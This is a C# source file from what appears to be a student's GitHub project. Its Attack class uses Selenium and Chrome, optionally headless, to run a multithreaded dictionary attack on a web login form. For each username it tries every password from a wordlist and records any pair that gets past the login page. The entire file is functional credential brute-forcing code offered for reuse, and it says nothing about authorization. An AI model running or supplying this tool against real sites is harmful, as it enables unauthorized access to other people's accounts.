/**************************************************************************
 *                                                                        *
 *  File:        Attack.cs                                                *
 *  Copyright:   (c) 2020, Rosca Marius - Iulian                          *
 *  E-mail:      marius-iulian.rosca@student.tuiasi.ro                    *
 *  Website:     https://github.com/RoscaMariusIulian                     *
 *  Description: Creates threads and calls the attack.                    *
 *                                                                        *
 *  This code and information is provided "as is" without warranty of     *
 *  any kind, either expressed or implied, including but not limited      *
 *  to the implied warranties of merchantability or fitness for a         *
 *  particular purpose. You are free to use this source code in your      *
 *  applications as long as the original copyright notice is included.    *
 *                                                                        *
 **************************************************************************/
#region includes
using Files;
using System;
using System.Threading;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using System.Collections.Generic;
#endregion

namespace Hacking
{
    public class Attack
    {
        #region variables
        Reader _usernames = new Reader("usernames.txt"); 
        Reader _passwords = new Reader("passwords.txt");

        public List<string> ValidUser = new List<string>();
        public List<string> ValidPass = new List<string>();

        private string _usernameXPath;
        private string _passwordXPath;
        private string _buttonXPath;
        private string _url;
        private bool isState;
        #endregion

        #region methods
        public Attack(string url, string username, string password, string btn, bool state) 
        {
            this._url = url; 
            _usernameXPath = username; 
            _passwordXPath = password;
            _buttonXPath = btn;
            this.isState = state;
        }
        public void Start()
        {
            try
            {
                List<Thread> threads = new List<Thread>();
                Thread th = null;
                foreach (string user in _usernames.Items) 
                {
                    th = new Thread(new ParameterizedThreadStart(DictionaryAttack));
                    th.Start(user);
                    threads.Add(th);
                }
                foreach(var thread in threads) 
                    thread.Join();
            }
            catch (Exception ThreadException)
            {
                Console.WriteLine(ThreadException);
            }
        }

        private void DictionaryAttack(object x)
        {
            string user = (string)x;
            IWebElement username; 
            IWebElement password;
            IWebElement button;
            var chromeOptions = new ChromeOptions();
            if (isState == true) 
                chromeOptions.AddArguments(new List<string>() { "--silent-launch", "--no-startup-window", "headless" });
            var chromeDriverService = ChromeDriverService.CreateDefaultService();
            chromeDriverService.HideCommandPromptWindow = true;
            ChromeDriver driver = new ChromeDriver(chromeDriverService, chromeOptions); 
            driver.Navigate().GoToUrl(_url);
            string recentpass = "";
            foreach (string pass in _passwords.Items) 
            {

                if (driver.Url.Equals(_url))
                {
                    try
                    {
                        recentpass = pass; 
                        username = driver.FindElement(By.XPath(_usernameXPath)); 
                        password = driver.FindElement(By.XPath(_passwordXPath));
                        button = driver.FindElement(By.XPath(_buttonXPath));
                        username.SendKeys(user); 
                        password.SendKeys(pass); 
                        button.Click(); 
                    }
                    catch (Exception)
                    {
                        Console.WriteLine("xPaths are wrong!"); 
                        break;
                    }
                }
                else
                {
                    ValidUser.Add(user); 
                    ValidPass.Add(recentpass);
                    break;
                }
            }
            driver.Quit();
        }
        #endregion
    }
}
